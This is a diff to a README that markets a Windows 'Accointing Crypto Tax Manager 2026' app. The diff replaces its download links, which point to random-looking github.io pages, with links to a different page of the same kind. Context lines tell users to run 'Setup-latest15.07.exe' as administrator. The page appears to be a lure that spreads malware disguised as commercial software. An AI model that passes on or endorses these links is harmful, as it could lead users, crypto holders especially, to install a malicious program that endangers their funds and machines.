@@ -2,7 +2,7 @@
 
 Accointing Crypto Tax Manager 2026 is the ultimate desktop solution for cryptocurrency investors who need reliable, accurate, and hassle-free tax reporting on Windows 10 and 11. This full-featured application streamlines the entire process of tracking your digital asset portfolio, calculating capital gains and losses, and generating compliant tax reports ready for submission. Whether you hold Bitcoin, Ethereum, or hundreds of altcoins across multiple wallets and exchanges, Accointing Crypto Tax Manager 2026 brings everything together in one powerful, user-friendly interface.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -71,7 +71,7 @@ A: Ensure you are running **Setup-latest15.07.exe** as an administrator and that
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Changelog
 
